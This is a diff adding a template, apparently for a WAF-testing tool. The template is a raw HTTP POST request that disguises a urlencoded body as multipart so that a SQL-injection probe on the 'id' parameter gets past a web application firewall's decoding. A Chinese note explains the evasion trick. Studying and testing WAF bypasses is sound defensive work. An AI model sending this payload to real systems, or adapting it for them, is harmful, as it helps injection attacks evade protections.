@@ -1,0 +1,15 @@
+# @name: urlencoded伪装multipart
+# @tags: post,multipart,urlencoded,disguise,php,id,bypass
+# @color: cyan
+# @validate: baseline_similarity
+# @threshold: 0.92
+# @intent: urlencoded_disguise_multipart
+# @intent.param: id
+# @intent.payload: id=1' and 'a'='a
+# @note: Content-Type 为 urlencoded，body 中用 & 截取前后 multipart 装饰部分保留 id 参数完整。WAF 因看到 multipart 形态按文件内容处理不做 URL 解码，漏检 %0a 等编码字符，后端 urldecode 后还原真实 payload。参考 do9gy Part2 第4条。
+POST / HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+Content-Type: application/x-www-form-urlencoded
+
+--a%0d%0aContent-Disposition: form-data; name="id"%0d%0a%0d%0a&id=1'%0aand%0a'a'='a&--a--
